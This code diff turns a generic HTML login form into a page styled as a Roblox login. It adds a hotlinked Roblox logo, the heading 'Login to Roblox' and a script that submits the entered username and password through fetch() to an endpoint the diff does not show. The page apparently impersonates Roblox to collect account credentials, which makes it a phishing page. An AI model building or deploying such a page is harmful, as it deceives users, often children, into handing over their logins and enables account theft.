@@ -5,22 +5,90 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login</title>
     <style>
-        body { font-family: Arial, sans-serif; }
-        .login-form { max-width: 400px; margin: 0 auto; padding: 20px; border: 1px solid #ccc; border-radius: 8px; }
-        input { width: 100%; padding: 10px; margin: 5px 0; }
-        button { width: 100%; padding: 10px; background-color: #4CAF50; color: white; border: none; cursor: pointer; }
-        button:hover { background-color: #45a049; }
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #e5e5e5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-form {
+            background-color: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            padding: 40px;
+            width: 300px;
+            text-align: center;
+        }
+
+        h2 {
+            color: #333333;
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 2px solid #cccccc;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+
+        input:focus {
+            border-color: #4CAF50;
+            outline: none;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #3b82f6;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #2563eb;
+        }
+
+        .status-message {
+            margin-top: 20px;
+            font-size: 16px;
+        }
+
+        .status-message.success {
+            color: #28a745;
+        }
+
+        .status-message.error {
+            color: #dc3545;
+        }
+
+        .roblox-logo {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+
     </style>
 </head>
 <body>
     <div class="login-form">
-        <h2>Login</h2>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/e/eb/Roblox_Logo_2017.png" alt="Roblox Logo" class="roblox-logo">
+        <h2>Login to Roblox</h2>
         <form id="loginForm">
             <input type="text" id="username" name="username" placeholder="Username" required><br>
             <input type="password" id="password" name="password" placeholder="Password" required><br>
-            <button type="submit">Login</button>
+            <button type="submit">Log In</button>
         </form>
-        <p id="statusMessage"></p>
+        <p id="statusMessage" class="status-message"></p>
     </div>
 
     <script>
@@ -42,13 +110,15 @@
             })
             .then(response => response.json())
             .then(data => {
-                // Show status message if request is successful
-                document.getElementById('statusMessage').textContent = 'Logged in!';
+                // Show success message if request is successful
+                document.getElementById('statusMessage').textContent = 'Logged in successfully!';
+                document.getElementById('statusMessage').classList.add('success');
                 console.log('Success:', data);
             })
             .catch(error => {
                 // Show error message
                 document.getElementById('statusMessage').textContent = 'Error: Unable to login';
+                document.getElementById('statusMessage').classList.add('error');
                 console.error('Error:', error);
             });
         });
